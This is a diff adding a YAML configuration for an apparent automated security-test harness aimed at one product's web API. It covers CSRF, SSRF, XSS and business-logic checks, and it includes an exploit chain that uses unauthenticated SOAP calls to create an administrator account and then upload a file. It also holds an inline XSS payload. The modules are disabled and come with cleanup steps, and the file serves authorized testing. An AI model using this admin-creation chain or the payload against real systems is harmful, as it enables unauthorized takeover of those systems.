@@ -1,0 +1,144 @@
+auth:
+  type: openapi
+csrf:
+  enabled: false
+  baseline:
+    method: POST
+    path: /api/v1/user/add
+    headers:
+      Content-Type: application/json
+    json:
+      userName: secauto_csrf_base
+      password: Test123456
+      passwordType: 1
+      departId: 0
+  replay:
+    method: POST
+    path: /api/v1/user/add
+    headers:
+      Content-Type: application/json
+    json:
+      userName: secauto_csrf_base
+      password: Test123456
+      passwordType: 1
+      departId: 0
+  strip_headers:
+  - Origin
+  - Referer
+  strip_body_keys: []
+csrf_ui:
+  enabled: false
+  username: sysmanager
+  password_env: SEC_BACKEND_PASS
+  action:
+    method: POST
+    path: /api/v1/user/add
+    json:
+      userName: secauto_csrf_${run_id}
+      password: Test123456
+  cleanup:
+  - method: POST
+    path: /api/v1/user/del
+    json:
+      userName: secauto_csrf_${run_id}
+ssrf:
+  enabled: false
+  auto_start: true
+  timeout: 25
+  endpoints:
+  - method: POST
+    path: /api/v1/control/10000/subscriptions
+    param: address
+    param_in: json
+    base_body:
+      event: USER
+      durable: true
+  cleanup:
+  - method: DELETE
+    path: /api/v1/control/10000/subscriptions
+    json:
+      event: USER
+business_logic:
+  enabled: false
+  flows:
+  - name: 用户重复注册
+    method: POST
+    path: /api/v1/user/add
+    headers:
+      Content-Type: application/json
+    baseline:
+      userName: secauto_logic_${run_id}
+      password: Test123456
+    variant:
+      userName: secauto_logic_${run_id}
+      password: Test654321
+    success_codes:
+    - 0
+    - '0'
+    cleanup:
+    - method: POST
+      path: /api/v1/user/del
+      json:
+        userName: secauto_logic_${run_id}
+rce_write_chain:
+  enabled: false
+  require_env: ALLOW_WRITE_CHAIN
+  steps:
+    get_node:
+      method: POST
+      path: /GToneServices3.5/services/GToneWebServices
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: ''
+      data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+        \n  xmlns:dbup=\"http://DBUpdate.webservice.gtone3.com\">\n  <soapenv:Header/><soapenv:Body><dbup:GetNodeInfo/></soapenv:Body>\n\
+        </soapenv:Envelope>\n"
+      node_regex: nodeID[^0-9]{0,20}(\d+)
+    add_admin:
+      method: POST
+      path: /GToneServices3.5/services/GToneWebServices
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: ''
+      template: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+        \n  xmlns:dbup=\"http://DBUpdate.webservice.gtone3.com\"\n  xmlns:vo=\"http://vo.webservice.gtone3.com\"\
+        >\n  <soapenv:Header/><soapenv:Body><dbup:AllUser><dbup:in0><vo:UserVO>\n\
+        \    <vo:adminRole>3</vo:adminRole><vo:departID>0</vo:departID>\n    <vo:displayName>secauto</vo:displayName><vo:nodeID>{node_id}</vo:nodeID>\n\
+        \    <vo:password>{password_md5}</vo:password><vo:userName>{username}</vo:userName>\n\
+        \    <vo:userID>10999</vo:userID><vo:status>0</vo:status>\n  </vo:UserVO></dbup:in0></dbup:AllUser></soapenv:Body>\n\
+        </soapenv:Envelope>\n"
+    login:
+      method: POST
+      path: /auth/v1/login
+      headers:
+        Content-Type: application/json
+      json:
+        name: '{username}'
+        password: '{password}'
+    upload:
+      method: POST
+      path: /api/v1/room/watermark/0
+  cleanup:
+  - method: POST
+    path: /api/v1/user/del
+    json:
+      userName: '{username}'
+idor_accounts: {}
+write_xss:
+  enabled: false
+  user:
+    username: sysmanager
+    password_env: SEC_BACKEND_PASS
+    depart: 1
+  payload: <img src=x onerror=window.__xss=1>
+write_injection:
+  enabled: false
+business_logic_full:
+  enabled: false
+terminal_xss:
+  enabled: false
+  depart_id: 1
+  terminal_type: 1
+  user:
+    username: admin05
+    password_env: SEC_BACKEND_PASS
